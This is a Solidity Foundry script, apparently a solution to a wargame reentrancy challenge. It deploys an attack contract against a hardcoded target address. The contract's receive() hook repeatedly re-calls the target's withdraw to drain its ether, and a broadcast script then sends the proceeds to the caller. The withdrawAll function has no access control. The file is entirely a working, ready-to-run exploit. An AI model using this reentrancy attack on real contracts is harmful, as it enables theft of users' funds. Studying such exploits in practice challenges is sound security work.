/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    address public owner;
    IReentrance reentrance;
    uint256 public attackValue = 0.001 ether;

    constructor(address _targetAddr) {
        reentrance = IReentrance(_targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= attackValue);
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    function withdrawAll() public returns (bool) {
        uint256 totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call{value: totalBalance}("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable {
        uint256 targetBalance = address(reentrance).balance;
        if (targetBalance >= attackValue) {
          reentrance.withdraw(attackValue);
        }
    }
}
contract ReEntrancy is Script {
    function run() public {
        vm.startBroadcast();

        ReentranceAttack reentranceAttack = new ReentranceAttack(0x2F276ecefD2d12aF1a38E2E8CA3282AE7CBd1c2c);
        reentranceAttack.donateAndWithdraw{value: reentranceAttack.attackValue()}();
        reentranceAttack.withdrawAll();

        vm.stopBroadcast();
    }
}
